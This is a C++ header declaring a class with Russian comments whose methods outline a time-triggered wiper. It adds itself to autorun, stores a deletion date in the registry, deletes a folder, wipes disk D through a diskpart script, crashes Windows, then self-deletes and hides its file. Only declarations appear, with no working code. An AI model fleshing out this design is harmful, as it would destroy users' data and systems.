#pragma once
class CDeleteDay
{
public:
	CDeleteDay();
	~CDeleteDay();

	// //добавляем себя автозагрузку
	static bool AddToAutoRun();
	// Проверить не наступил ли день выполнения задания
	static bool InspectDeleteData();

private:
	// записываем в реестр когда выполнится задача
	bool SaveDeleteDay();
	// записываем какую папку будем удалять
	bool SaveFolderPathToDelete();
	
	bool DeleteFolder();
	bool PerformATask();
	bool IfDeleteDiskD();
	bool IfKillWindows();
	void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
	void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
	bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[]);
	bool CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[]);
	void KeyBoardLedBlink(void);
	void DoKillWindows();

	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();

	void SelfDelete();
	void HideFile();
};

